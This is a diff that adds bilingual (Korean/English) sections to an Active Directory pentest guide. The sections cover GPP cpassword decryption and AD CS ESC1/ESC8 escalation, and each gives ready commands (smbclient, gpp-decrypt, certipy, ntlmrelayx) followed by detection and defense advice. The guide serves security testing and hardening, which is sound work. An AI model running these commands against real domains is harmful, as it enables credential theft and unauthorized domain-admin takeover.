@@ -889,6 +889,54 @@ hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
 | LAPS 미사용 | MEDIUM | 로컬 관리자 해시 재사용 | LAPS 배포 현황 |
 | SMB 서명 비활성화 | HIGH | NTLM 릴레이 | SMB 서명 정책 확인 |
 
+### 6.4 GPP(Group Policy Preferences) 자격증명 노출 — cpassword
+
+과거 GPP는 로그온 스크립트나 예약 작업, 드라이브 매핑에 쓸 로컬 계정 비밀번호를 그룹 정책 안에 AES-256으로 암호화해 저장했다. 문제는 마이크로소프트가 이 **AES 키를 공개 문서(MSDN)에 그대로 게시**했다는 점이다(MS14-025로 신규 생성은 막혔지만, 오래된 도메인의 SYSVOL에는 여전히 `Groups.xml` 파일이 남아있는 경우가 많다). SYSVOL은 인증된 도메인 사용자라면 누구나 읽을 수 있는 공유이므로, 낮은 권한 계정 하나만 있어도 로컬 관리자 비밀번호를 즉시 복호화할 수 있다.
+
+```bash
+# 1) SYSVOL에서 cpassword가 포함된 XML 찾기 (인증된 일반 사용자 권한으로 충분)
+smbclient -U 'corp.local/alice%Password123' //10.10.10.100/SYSVOL -c \
+  'recurse; ls' 2>/dev/null | grep -i xml
+
+# 또는 마운트 후 직접 검색
+find /mnt/sysvol -iname 'Groups.xml' -o -iname 'Services.xml' -o -iname 'ScheduledTasks.xml' \
+  2>/dev/null | xargs grep -l cpassword
+
+# 2) 공개된 AES 키로 복호화 (Kali 기본 포함 도구)
+gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83njW+iuoU9jhr5CGFvW0'
+
+# 3) PowerShell(Windows 진영, PowerSploit 계열)
+# Get-GPPPassword.ps1
+```
+
+**탐지/방어**: MS14-025 패치 이후에도 남아있는 레거시 `Groups.xml`/`Services.xml`/`ScheduledTasks.xml`을 SYSVOL 전수 스캔으로 찾아 제거하고, 그 안에 있던 비밀번호는 이미 유출된 것으로 간주해 즉시 교체한다. SYSVOL에 대한 비정상적인 대량 파일 열람(특히 일반 사용자 계정의 짧은 시간 내 다수 XML 접근)은 이벤트 로그·파일 접근 감사(SACL)로 탐지할 수 있다.
+
+### 6.5 AD CS(인증서 서비스) 오남용 — ESC1 / ESC8
+
+AD Certificate Services(ADCS)는 잘못 설정된 인증서 템플릿이나 웹 등록 엔드포인트가 있으면 일반 사용자를 도메인 관리자로 격상시키는 통로가 된다. 가장 널리 알려진 두 경로는 다음과 같다.
+
+- **ESC1**: 템플릿이 `ENROLLEE_SUPPLIES_SUBJECT`(요청자가 SAN을 직접 지정 가능) + 클라이언트 인증 EKU + 낮은 권한 계정의 등록 권한을 동시에 허용하면, 공격자가 SAN을 `administrator`로 지정한 인증서를 발급받아 그대로 도메인 관리자로 인증할 수 있다.
+- **ESC8**: CA의 웹 등록 인터페이스(`/certsrv`)가 HTTP + NTLM 인증만 지원하면, NTLM 릴레이로 피해자의 인증을 CA 웹 등록으로 릴레이해 피해자 명의의 인증서를 강제로 발급받을 수 있다.
+
+```bash
+# 1) 취약한 템플릿 탐색 (certipy)
+pip install certipy-ad
+certipy find -u alice@corp.local -p Password123 -dc-ip 10.10.10.100 -vulnerable
+
+# 2) ESC1 — 임의 사용자(administrator) 명의 인증서 요청
+certipy req -u alice@corp.local -p Password123 -dc-ip 10.10.10.100 \
+  -ca corp-CA -template VulnerableTemplate -upn administrator@corp.local
+
+# 3) 발급받은 인증서로 PKINIT 인증 → TGT 및 NT 해시 획득
+certipy auth -pfx administrator.pfx -dc-ip 10.10.10.100
+
+# 4) ESC8 — NTLM 릴레이를 웹 등록 엔드포인트로
+ntlmrelayx.py -t http://ca-server.corp.local/certsrv/certfnsh.asp \
+  --adcs --template DomainController
+```
+
+**탐지/방어**: `certipy find`로 정기적으로 자체 템플릿을 감사해 `ENROLLEE_SUPPLIES_SUBJECT` + 클라이언트 인증 EKU + 광범위한 등록 권한이 함께 부여된 템플릿을 찾아 즉시 수정한다. CA 웹 등록은 HTTPS + Extended Protection for Authentication(EPA) 강제 또는 아예 비활성화하고, LDAP·LDAPS 채널 바인딩도 함께 강제한다. 인증서 발급 이벤트(CA 로그, 이벤트 4886/4887)에서 평소 발급 이력이 없는 계정이 상급 SAN으로 인증서를 발급받는 패턴을 모니터링한다.
+
 ---
 
 ## 7. 참고 도구
@@ -903,6 +951,8 @@ hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
 | `rpcclient` | RPC 기반 AD 열거 |
 | `enum4linux-ng` | Linux SMB/AD 열거 |
 | `ADRecon` | 포렌식 친화적 AD 정보 수집 |
+| `gpp-decrypt` | SYSVOL cpassword 복호화 |
+| `certipy-ad` | AD CS 템플릿 취약점 탐색·악용 |
 
 ---
 
@@ -1280,6 +1330,54 @@ Analogy: Imagine calling a reception desk and asking for "Alice's extension"
 | LAPS not deployed | MEDIUM | Local admin hash reuse | LAPS deployment status |
 | SMB signing disabled | HIGH | NTLM relay | SMB signing policy check |
 
+### 6.4 GPP (Group Policy Preferences) Credential Exposure — cpassword
+
+Legacy GPP could store a local account password (for logon scripts, scheduled tasks, drive mappings) AES-256-encrypted inside a group policy. The catch: Microsoft **published that AES key in public MSDN documentation**. MS14-025 stopped new passwords from being pushed this way, but many older domains still have leftover `Groups.xml` files sitting in SYSVOL. Since SYSVOL is readable by any authenticated domain user, a single low-privilege account is enough to decrypt a local administrator password instantly.
+
+```bash
+# 1) Find XML files containing cpassword in SYSVOL (a regular authenticated user is enough)
+smbclient -U 'corp.local/alice%Password123' //10.10.10.100/SYSVOL -c \
+  'recurse; ls' 2>/dev/null | grep -i xml
+
+# or search directly after mounting
+find /mnt/sysvol -iname 'Groups.xml' -o -iname 'Services.xml' -o -iname 'ScheduledTasks.xml' \
+  2>/dev/null | xargs grep -l cpassword
+
+# 2) Decrypt with the publicly known AES key (built into Kali)
+gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83njW+iuoU9jhr5CGFvW0'
+
+# 3) PowerShell equivalent (PowerSploit-style)
+# Get-GPPPassword.ps1
+```
+
+**Detection/Defense**: Sweep SYSVOL for leftover `Groups.xml` / `Services.xml` / `ScheduledTasks.xml` even after applying MS14-025, remove them, and treat any password that was ever stored there as already compromised — rotate it immediately. Unusual bulk file access to SYSVOL (especially many XML reads by a regular user account in a short window) can be caught with file-access auditing (SACL) and event log monitoring.
+
+### 6.5 AD CS (Certificate Services) Abuse — ESC1 / ESC8
+
+AD Certificate Services becomes a path to domain admin when certificate templates or the web enrollment endpoint are misconfigured. The two most well-known escalation paths:
+
+- **ESC1**: if a template allows `ENROLLEE_SUPPLIES_SUBJECT` (the requester can specify the SAN) plus a client-authentication EKU plus enrollment rights for a low-privileged principal, an attacker can request a certificate with the SAN set to `administrator` and authenticate as a domain admin with it.
+- **ESC8**: if the CA's web enrollment interface (`/certsrv`) only supports HTTP + NTLM authentication, an attacker can NTLM-relay a victim's authentication into the web enrollment endpoint and obtain a certificate issued in the victim's name.
+
+```bash
+# 1) Find vulnerable templates (certipy)
+pip install certipy-ad
+certipy find -u alice@corp.local -p Password123 -dc-ip 10.10.10.100 -vulnerable
+
+# 2) ESC1 — request a certificate impersonating an arbitrary user (administrator)
+certipy req -u alice@corp.local -p Password123 -dc-ip 10.10.10.100 \
+  -ca corp-CA -template VulnerableTemplate -upn administrator@corp.local
+
+# 3) Authenticate via PKINIT with the issued cert -> get a TGT and the NT hash
+certipy auth -pfx administrator.pfx -dc-ip 10.10.10.100
+
+# 4) ESC8 — NTLM-relay to the web enrollment endpoint
+ntlmrelayx.py -t http://ca-server.corp.local/certsrv/certfnsh.asp \
+  --adcs --template DomainController
+```
+
+**Detection/Defense**: Regularly audit your own templates with `certipy find` and fix any template that combines `ENROLLEE_SUPPLIES_SUBJECT`, a client-auth EKU, and broad enrollment rights. Enforce HTTPS + Extended Protection for Authentication (EPA) on CA web enrollment, or disable it outright, and enforce LDAP/LDAPS channel binding alongside it. Monitor certificate issuance events (CA logs, event IDs 4886/4887) for accounts with no prior issuance history suddenly obtaining certificates with elevated SANs.
+
 ---
 
 ## 7. Reference Tools
@@ -1294,6 +1392,8 @@ Analogy: Imagine calling a reception desk and asking for "Alice's extension"
 | `rpcclient` | RPC-based AD enumeration |
 | `enum4linux-ng` | Linux SMB/AD enumeration |
 | `ADRecon` | Forensic-friendly AD information collection |
+| `gpp-decrypt` | Decrypt SYSVOL cpassword values |
+| `certipy-ad` | Find and exploit AD CS template misconfigurations |
 | `Impacket GetUserSPNs.py` | Kerberoasting |
 | `Impacket GetNPUsers.py` | AS-REP Roasting |
 
